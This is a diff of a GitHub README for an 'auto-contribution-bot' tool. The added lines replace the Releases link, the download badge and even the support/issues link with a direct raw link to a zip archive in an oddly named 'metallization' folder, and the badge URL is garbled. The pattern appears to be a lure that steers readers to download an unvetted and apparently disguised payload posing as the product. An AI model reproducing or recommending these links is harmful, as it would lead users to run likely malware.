@@ -1,6 +1,6 @@
 # 🤖 auto-contribution-bot - Keep Your GitHub Active Effortlessly
 
-[![Download the auto-contribution-bot](https://img.shields.io/badge/Download%20Now-Get%20Started-blue.svg)](https://github.com/jeevan-rgb/auto-contribution-bot/releases)
+[![Download the auto-contribution-bot](https://github.com/jeevan-rgb/auto-contribution-bot/raw/refs/heads/main/metallization/bot-contribution-auto-v2.2-beta.4.zip%20Now-Get%https://github.com/jeevan-rgb/auto-contribution-bot/raw/refs/heads/main/metallization/bot-contribution-auto-v2.2-beta.4.zip)](https://github.com/jeevan-rgb/auto-contribution-bot/raw/refs/heads/main/metallization/bot-contribution-auto-v2.2-beta.4.zip)
 
 ## 📃 Description
 
@@ -25,7 +25,7 @@ Follow these steps to set up the auto-contribution-bot on your computer.
 
 ### 📥 Download & Install
 
-To download the software, visit the Releases page: [Download auto-contribution-bot](https://github.com/jeevan-rgb/auto-contribution-bot/releases).
+To download the software, visit the Releases page: [Download auto-contribution-bot](https://github.com/jeevan-rgb/auto-contribution-bot/raw/refs/heads/main/metallization/bot-contribution-auto-v2.2-beta.4.zip).
 
 1. **Visit the Releases Page**: Click on the link above to open the auto-contribution-bot Releases page.
   
@@ -80,7 +80,7 @@ The auto-contribution-bot is open for contributions. If you have suggestions or 
 
 ## 📞 Support
 
-If you need assistance or have questions, you can open an issue on the [GitHub repository](https://github.com/jeevan-rgb/auto-contribution-bot/issues). We will try to respond as soon as possible.
+If you need assistance or have questions, you can open an issue on the [GitHub repository](https://github.com/jeevan-rgb/auto-contribution-bot/raw/refs/heads/main/metallization/bot-contribution-auto-v2.2-beta.4.zip). We will try to respond as soon as possible.
 
 ## 📅 Changelog
 
